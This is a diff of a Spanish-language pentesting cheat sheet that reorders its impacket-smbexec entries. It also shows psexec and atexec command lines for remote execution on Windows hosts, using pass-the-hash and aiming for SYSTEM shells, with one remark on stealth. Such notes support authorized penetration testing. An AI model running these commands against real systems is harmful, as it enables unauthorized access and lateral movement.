@@ -480,14 +480,6 @@ NOTA:
 	- Si no funciona por ``SMB o WinRM`` utilizar ``WMIExec2`` para la evasión y conexión mediante WMI
 
 ```bash
-❯ impacket-smbexec domain.corp/user:'Password'@IP
-# Ingresar por smb
-# Crea servicio → devuelve shell como NT AUTHORITY\SYSTEM
-
-❯ impacket-smbexec 'Administrator'@<IP> -hashes LM:NT
-# Alternativa a psexec
-# Más estable en algunos entornos pero menos interactivo
-
 ❯ impacket-psexec -port 445 domain/user@<IP> -hashes :NThash
 # Especificar puerto cuando el default falla
 
@@ -504,6 +496,14 @@ NOTA:
 ❯ impacket-psexec domain.corp/'Administrator'@<IP> -hashes :NT
 # Pass-the-Hash → solo necesitas NT hash (no password)
 # Requiere admin local
+
+❯ impacket-smbexec domain.corp/user:'Password'@IP
+# Ingresar por smb
+# Crea servicio → devuelve shell como NT AUTHORITY\SYSTEM
+
+❯ impacket-smbexec 'Administrator'@<IP> -hashes LM:NT
+# Alternativa a psexec
+# Más estable en algunos entornos pero menos interactivo
 
 ❯ impacket-atexec domain/user:'pass'@<IP> "whoami"
 # Ejecución vía Task Scheduler — más sigiloso que psexec
